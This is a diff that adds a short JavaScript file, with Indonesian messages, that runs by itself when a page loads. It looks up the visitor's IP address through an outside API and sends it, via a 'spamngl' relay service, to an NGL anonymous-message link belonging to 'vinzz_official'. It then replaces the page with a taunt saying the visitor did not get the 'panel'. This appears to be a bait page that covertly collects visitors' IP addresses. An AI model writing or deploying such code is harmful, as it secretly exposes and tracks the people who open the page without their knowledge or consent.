@@ -1,0 +1,23 @@
+async function autoKirim() {
+  try {
+    const res = await fetch('https://api.betabotz.eu.org/ip');
+    const data = await res.json();
+
+    const pesan = `IP berhasil di temukan:\nIP: ${data.ip}`;
+    const encodedPesan = encodeURIComponent(pesan);
+
+    const nglUrl = `https://fastrestapis.fasturl.cloud/tool/spamngl?link=https://ngl.link/vinzz_official&message=${encodedPesan}&type=anonymous&count=1`;
+
+    const send = await fetch(nglUrl);
+    if (send.ok) {
+      document.body.innerHTML = '<h2>Yah sayang broo gk dapet panelnya.<br><small>by Vinzz Official</small></h2>';
+    } else {
+      document.body.innerHTML = '<h2>Terjadi kesalahan saat mengirim request ke developer</h2>';
+    }
+  } catch (err) {
+    console.error(err);
+    document.body.innerHTML = '<h2>Terjadi error saat mengirim.</h2>';
+  }
+}
+
+autoKirim();
